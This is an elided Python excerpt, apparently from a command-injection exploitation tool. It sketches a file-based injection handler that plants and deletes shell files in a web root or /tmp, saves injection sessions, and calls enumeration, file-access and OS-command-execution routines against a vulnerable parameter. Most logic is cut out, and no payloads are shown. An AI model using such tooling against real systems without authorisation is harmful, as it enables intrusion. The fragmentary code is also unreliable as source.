...
def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter,
...
def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
    ...
    settings.WEB_ROOT = input(settings.print_question_msg(question_msg))
                ...
                for separator in settings.SEPARATORS:
                    ...
                    if settings.LOAD_SESSION:
                        try:
                            ...
                            if technique == "tempfile-based injection technique":
                                ...
                                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method,
                                                         url_time_response)
                        except TypeError:
                    ...
                    if not settings.LOAD_SESSION:
                        ...
                        try:
                            ...
                            try:
                                ...
                                if str(e.getcode()) == settings.NOT_FOUND_ERROR:
                                    ...
                                    if call_tmp_based == True:
                                        ...
                                        tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method,
                                                       url_time_response)
                                        raise
                                    ...
                                    # Use the "/tmp/" directory for tempfile-based technique.
                                        ...
                                        while True:
                                            if not menu.options.batch:
                                                ...
                                                tmp_upload = input(settings.print_question_msg(question_msg))
                                            else:
                                                tmp_upload = ""
                                            if len(tmp_upload) == 0:
                                                tmp_upload = "Y"
                                            if tmp_upload in settings.CHOICE_YES:
                                                ...
                                                call_tfb = tfb_controller(no_result, url, timesec, filename, tmp_path,
                            ...
                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace,
                    ...
                    if shell:
                        ...
                        if vp_flag == True:
                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method,
                        ...
                        if not settings.LOAD_SESSION:
                            session_handler.injection_point_importation(url, technique, injection_type, separator,
                                                                        shell[0], vuln_parameter, prefix, suffix, TAG,
                                                                        alter_shell, payload, http_request_method,
                                                                        url_time_response=0, timesec=0, how_long=0,
                                                                        output_length=0,
                        ...
                        if settings.ENUMERATION_DONE == True:
                            while True:
                                ...
                                if enumerate_again in settings.CHOICE_YES:
                                    fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix,
                            ...
                            if menu.enumeration_options():
                                fb_enumeration.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace,
                                                        http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE,
                                                        alter_shell, filename)
                        ...
                        if settings.FILE_ACCESS_DONE == True:
                            ...
                            while True:
                                ...
                                if file_access_again in settings.CHOICE_YES:
                                    fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix,
                                                            whitespace, http_request_method, url, vuln_parameter,
                                                            OUTPUT_TEXTFILE, alter_shell, filename)
                                    print(settings.SINGLE_WHITESPACE)
                                    break
                            ...
                            if menu.file_access_options():
                                ...
                                #   print(settings.SINGLE_WHITESPACE)
                                fb_file_access.do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace,
                                                        http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE,
                                                        alter_shell, filename)
                                print(settings.SINGLE_WHITESPACE)
                        ...
                        if menu.options.os_cmd:
                            ...
                            #   print(settings.SINGLE_WHITESPACE)
                            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, timesec, prefix, suffix,
                                                              whitespace, http_request_method, url, vuln_parameter,
                                                              OUTPUT_TEXTFILE, alter_shell, filename)
                            # Delete previous shell (text) files (output)
                            delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace,
...
def exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique):
    if fb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type,
                            technique) == False:
        return False
